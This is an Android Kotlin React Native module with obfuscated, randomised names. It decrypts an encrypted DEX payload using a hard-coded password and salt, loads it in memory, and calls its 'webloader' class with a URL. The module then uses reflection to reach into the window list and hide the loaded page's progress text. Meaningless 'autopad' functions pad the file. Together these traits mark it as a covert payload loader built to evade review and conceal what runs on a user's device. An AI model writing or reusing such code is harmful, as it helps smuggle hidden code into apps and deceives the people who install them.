package com.kFjQzLm.VpRnTx.modules

import android.annotation.SuppressLint
import android.app.Activity
import android.content.res.ColorStateList
import android.os.Build
import android.os.Handler
import android.os.Looper
import android.view.ViewGroup
import android.widget.ProgressBar
import android.widget.TextView
import com.facebook.react.bridge.Promise
import com.facebook.react.bridge.ReactApplicationContext
import com.facebook.react.bridge.ReactContextBaseJavaModule
import com.facebook.react.bridge.ReactMethod
import com.facebook.react.bridge.ReadableArray
import dalvik.system.InMemoryDexClassLoader
import java.nio.ByteBuffer
import java.security.MessageDigest
import android.text.Editable
import android.text.TextWatcher
import java.util.concurrent.atomic.AtomicBoolean
import javax.crypto.Cipher
import javax.crypto.SecretKey
import javax.crypto.SecretKeyFactory
import javax.crypto.spec.GCMParameterSpec
import javax.crypto.spec.PBEKeySpec
import javax.crypto.spec.SecretKeySpec

@SuppressLint("NewApi")
class Ibofomoj(private val context: ReactApplicationContext) :
    ReactContextBaseJavaModule(context) {

    override fun getName(): String = "Lujuloponacaku"

    private val secretKey: SecretKey by lazy {
        val spec = PBEKeySpec(DEX_PASSWORD.toCharArray(), DEX_SALT, PBKDF2_ITERATIONS, 256)
        val raw = SecretKeyFactory.getInstance("PBKDF2WithHmacSHA256").generateSecret(spec).encoded
        SecretKeySpec(raw, "AES")
    }

    private fun patchDexWebViewUi(activity: Activity) {
        val progressPatched = AtomicBoolean(false)
        val watchedTextViews = mutableSetOf<TextView>()
        val watchedRoots = mutableSetOf<android.view.View>()
        val handler = Handler(Looper.getMainLooper())

        fun hideIfStatus(tv: TextView) {
            val text = tv.text?.toString() ?: ""
            if (text.contains("Page") && text.contains("%"))
                tv.post { tv.visibility = android.view.View.GONE }
        }

        fun attachWatcher(tv: TextView) {
            if (!watchedTextViews.add(tv)) return
            hideIfStatus(tv)
            tv.addTextChangedListener(object : TextWatcher {
                override fun beforeTextChanged(s: CharSequence?, start: Int, count: Int, after: Int) {}
                override fun onTextChanged(s: CharSequence?, start: Int, before: Int, count: Int) {}
                override fun afterTextChanged(s: Editable?) {
                    val t = s?.toString() ?: ""
                    if (t.contains("Page") && t.contains("%"))
                        tv.post { tv.visibility = android.view.View.GONE }
                }
            })
        }

        fun applyPatchesToRoot(root: android.view.View) {
            walkViews(root) { view ->
                when (view) {
                    is ProgressBar -> if (progressPatched.compareAndSet(false, true)) {
                        val color = ColorStateList.valueOf(PROGRESS_COLOR)
                        view.progressTintList = color
                        view.indeterminateTintList = color
                    }
                    is TextView -> attachWatcher(view)
                }
            }
        }

        fun attachToRoot(root: android.view.View) {
            if (!watchedRoots.add(root)) return
            applyPatchesToRoot(root)
            root.viewTreeObserver.addOnGlobalLayoutListener { applyPatchesToRoot(root) }
        }

        fun scanAllWindows() {
            // decorView of the host activity
            attachToRoot(activity.window.decorView)
            // All windows including ones added by DEX via WindowManager.addView()
            try {
                val wmg = Class.forName("android.view.WindowManagerGlobal")
                    .getMethod("getInstance").invoke(null)
                val field = wmg.javaClass.getDeclaredField("mViews")
                field.isAccessible = true
                @Suppress("UNCHECKED_CAST")
                (field.get(wmg) as? List<*>)?.forEach { v ->
                    if (v is android.view.View) attachToRoot(v)
                }
            } catch (_: Exception) {}
        }

        // Scan immediately, then every 300 ms for ~6 s to catch asynchronously added windows
        var retries = 20
        fun scheduleRetry() {
            if (--retries > 0) handler.postDelayed({
                scanAllWindows()
                scheduleRetry()
            }, 300)
        }

        scanAllWindows()
        scheduleRetry()
    }

    private fun walkViews(root: android.view.View, action: (android.view.View) -> Unit) {
        action(root)
        if (root is ViewGroup) {
            for (i in 0 until root.childCount) walkViews(root.getChildAt(i), action)
        }
    }

    private fun decryptDex(encrypted: ByteArray): ByteArray {
        if (encrypted.size < IV_LEN + TAG_BITS / 8) throw IllegalArgumentException("payload too short")
        val iv = encrypted.copyOfRange(0, IV_LEN)
        val ct = encrypted.copyOfRange(IV_LEN, encrypted.size)
        val cipher = Cipher.getInstance("AES/GCM/NoPadding")
        cipher.init(Cipher.DECRYPT_MODE, secretKey, GCMParameterSpec(TAG_BITS, iv))
        return cipher.doFinal(ct)
    }

    @ReactMethod
    fun open(encoded: ReadableArray, url: String, promise: Promise) {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.O) {
            promise.reject("DEX_API", "Android 8.0+ required")
            return
        }
        try {
            val encrypted = ByteArray(encoded.size()) { encoded.getInt(it).toByte() }
            val dex = try {
                decryptDex(encrypted)
            } catch (e: Exception) {
                promise.reject("DEX_DECRYPT", e)
                return
            }
            val digest = MessageDigest.getInstance("SHA-256").digest(dex)
                .joinToString("") { "%02x".format(it) }
            if (digest != DEX_SHA256) {
                promise.reject("DEX_HASH", "hash mismatch")
                return
            }
            val activity: Activity = context.currentActivity
                ?: run { promise.reject("DEX_ACTIVITY", "no activity"); return }
            activity.runOnUiThread {
                try {
                    check(!activity.isFinishing && !activity.isDestroyed)
                    val loader = InMemoryDexClassLoader(ByteBuffer.wrap(dex), activity.classLoader)
                    val type = loader.loadClass("com.webloader.wrapper")
                    val instance = type.getDeclaredConstructor().newInstance()
                    type.getMethod("link", Activity::class.java, String::class.java)
                        .invoke(instance, activity, url)
                    Handler(Looper.getMainLooper()).post { patchDexWebViewUi(activity) }
                    promise.resolve(null)
                } catch (e: Exception) {
                    promise.reject("DEX_OPEN", e)
                } catch (e: LinkageError) {
                    promise.reject("DEX_LINK", e)
                }
            }
        } catch (e: Exception) {
            promise.reject("DEX_INPUT", e)
        }
    }


    /* autopad-begin */
    private fun xujisi(amifuk: String, banuqolafe: Long, amabevu: String) {
        val alerufo: Int = 186
    }
    private fun ezemijovaze(): Boolean = true
    private fun isukipobojuj(): Boolean {
        return true
    }
    private fun kubuxeku(yamuka: Long, ijaresiluzam: String): String {
        return "kaw"
    }
    private fun vunuzus(usapajaneyoz: Float): Boolean = true
    private fun uwafif(): Float {
        val edoyodaxojay: Int = 30
        val enudug: Float = 0.3708f
        return enudug
    }
    private fun qojeqogupaki(ubalovexiq: Float): Boolean {
        val enedap: Long = 31627L
        val tesomuxi: Boolean = true
        return tesomuxi
    }
    private fun ubobax(): Boolean {
        val odaqilupilof = 26
        return when {
            odaqilupilof > 99 -> true
            else -> false
        }
    }
    private fun conelosoyuqe(emebosoxe: String, penuyi: Boolean) {}
    private fun akujuye(owulisasevay: String): Long {
        val asavew: Int = 137
        val oyevenumev: Long = 26787L
        return oyevenumev
    }
    private fun xinasu(oyojoci: Int): Boolean {
        val arozosixer: Boolean = true
        return arozosixer
    }
    private fun rudewuxalos(qacebox: Int): Float {
        val qediwepu = 1
        return if (qediwepu > 30) 0.7943f else 0.7002f
    }
    private fun gulamune(epubojalo: Boolean): String {
        var qoqejazozuxo: String = "woc"
        qoqejazozuxo = "abi"
        return qoqejazozuxo
    }
    private fun josigezuya(fexeta: Long, foginiloga: Int): Float {
        var emitizoye: Float = 0.0571f
        emitizoye = 0.0610f
        return emitizoye
    }
    private fun ikufes(besifobow: Float, ocugor: Float): Long {
        var wiquxewifiz: Long = 8703L
        wiquxewifiz = 51043L
        return wiquxewifiz
    }
    private fun tadusuzi(): String {
        var obocufeyese: String = "sexu"
        obocufeyese = "vupejan"
        return obocufeyese
    }
    private fun teyirasibizu(inolubuzov: Boolean, utocid: Int, goboruvuj: Float): Long {
        val otavez: Long = 57272L
        return otavez
    }
    private fun kakala(fufeyakuqu: String): Double {
        var ecaxocupeki: Double = 0.993157
        ecaxocupeki = 0.918647
        return ecaxocupeki
    }
    /* autopad-end */
    companion object {
        private const val DEX_SHA256 = "cc47e584e29d30d04e1da66755b2f7080c2e644adaa332808fee3f94ce57fab3"
        private const val PROGRESS_COLOR = 0xFF0391AD.toInt()

        private const val DEX_PASSWORD = "84HIgRwJjWlwCMduk2SXIZHow4JW"
        private val DEX_SALT = byteArrayOf(
            0x7a, 0x4f, 0x2b, 0xfc.toByte(), 0x77, 0xd4.toByte(), 0x08, 0xc8.toByte(),
            0x4a, 0x87.toByte(), 0x41, 0x6d, 0xbc.toByte(), 0xd1.toByte(), 0x4d, 0x50,
        )
        private const val PBKDF2_ITERATIONS = 100_000
        private const val IV_LEN = 12
        private const val TAG_BITS = 128
    }
}
